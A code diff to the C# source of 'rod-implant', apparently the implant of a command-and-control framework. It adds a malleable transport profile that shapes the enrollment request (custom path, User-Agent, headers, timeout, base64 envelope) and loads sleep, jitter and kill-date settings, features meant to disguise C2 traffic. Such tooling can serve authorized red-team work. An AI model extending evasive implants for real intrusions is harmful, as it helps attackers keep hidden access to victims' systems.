@@ -60,11 +60,16 @@ internal static class ImplantApp
 
         var serverCAs = CACertLoader.LoadOptional(config.CACertPath);
 
-        Console.Error.WriteLine($"rod-implant: enrolling at {config.EnrollURL}");
+        // The malleable transport profile (architecture.md Sec 7, M4.3) shapes the
+        // enroll request: a profiled enroll path, User-Agent, custom headers, a
+        // per-request timeout, and an optional base64 body envelope. The enroll URL
+        // carries the profile's path; the profile carries the rest.
+        var enrollUrl = config.ResolvedEnrollURL();
+        Console.Error.WriteLine($"rod-implant: enrolling at {enrollUrl}");
         Enrollment enrollment;
         try
         {
-            enrollment = await C2.EnrollAsync(config.EnrollURL, config.StagerToken, privateKey, serverCAs, cts.Token);
+            enrollment = await C2.EnrollAsync(enrollUrl, config.StagerToken, privateKey, serverCAs, config.Transport, cts.Token);
         }
         catch (Exception ex)
         {
@@ -167,6 +172,18 @@ internal static class BakedProfileSupport
         SetEnvIfPresent(root, "sleep", "ROD_SLEEP");
         SetEnvIfPresent(root, "jitter", "ROD_JITTER");
         SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
+        SetEnvIfPresent(root, "enrollPath", "ROD_ENROLL_PATH");
+        SetEnvIfPresent(root, "userAgent", "ROD_USER_AGENT");
+        SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
+        SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
+        // Headers ride as a nested object; re-emit the raw JSON verbatim into
+        // ROD_HEADERS, which config.Parse decodes back into the header map.
+        if (root.TryGetProperty("headers", out var headers)
+            && headers.ValueKind == System.Text.Json.JsonValueKind.Object
+            && Environment.GetEnvironmentVariable("ROD_HEADERS") is null)
+        {
+            Environment.SetEnvironmentVariable("ROD_HEADERS", headers.GetRawText());
+        }
     }
 
     private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
